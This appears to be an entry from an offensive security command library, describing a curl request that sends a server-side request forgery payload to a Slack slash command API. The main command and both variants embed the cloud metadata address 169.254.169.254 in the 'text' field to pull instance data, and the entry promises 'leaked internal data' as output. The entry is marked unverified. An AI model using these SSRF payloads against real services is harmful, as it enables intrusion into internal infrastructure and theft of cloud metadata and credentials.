---
data: >-
  curl -X POST https://slack.com/api/chat.command -H "Content-Type:
  application/x-www-form-urlencoded" -H "Authorization: Bearer YOUR_SLACK_TOKEN"
  -d
  "token=YOUR_VERIFICATION_TOKEN&team_id=YOUR_TEAM_ID&team_domain=yourteam&channel_id=CHANNEL_ID&channel_name=general&user_id=USER_ID&user_name=tester&command=/test&text=http://169.254.169.254/latest/meta-data/instance-id&response_url=RESPONSE_URL"
tags:
  - ssrf
  - web
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:08.929Z'
id: bb507ac9-faf7-413b-a3a1-b1ac2f099391
verified: false
validated: true
submitted: true
---
# curl-ssrf-slack

## Command

```bash
curl -X POST https://slack.com/api/chat.command -H "Content-Type: application/x-www-form-urlencoded" -H "Authorization: Bearer YOUR_SLACK_TOKEN" -d "token=YOUR_VERIFICATION_TOKEN&team_id=YOUR_TEAM_ID&team_domain=yourteam&channel_id=CHANNEL_ID&channel_name=general&user_id=USER_ID&user_name=tester&command=/test&text=http://169.254.169.254/latest/meta-data/instance-id&response_url=RESPONSE_URL"
```

## Description

This curl command sends a crafted POST request to Slack's slash command API endpoint to test for SSRF vulnerabilities by including an internal URL in the 'text' parameter, potentially bypassing mitigations and leaking internal service data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-H "Content-Type: ..."` | Sets form-encoded content type | Yes |
| `-H "Authorization: ..."` | Provides Slack API bearer token | Yes |
| `-d "..."` | Form data including command and SSRF payload in 'text' | Yes |
| `text=...` | Payload parameter for SSRF URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://slack.com/api/chat.command -H "Authorization: Bearer TOKEN" -d "command=/test&text=http://internal-url"
```

### Advanced Usage

```bash
curl -X POST https://slack.com/api/chat.command -H "Authorization: Bearer TOKEN" -d "command=/test&text=http://169.254.169.254/latest/meta-data/" | jq
```

## Expected Output

A JSON response from the Slack API, such as {"ok":true,"response":"leaked internal data"}. Successful SSRF shows non-standard content from internal services; errors indicate blocking.

## Related

- [[Related Procedure|procedures/Exploit-SSRF-Bypass-in-Slack-Slash-Commands]]
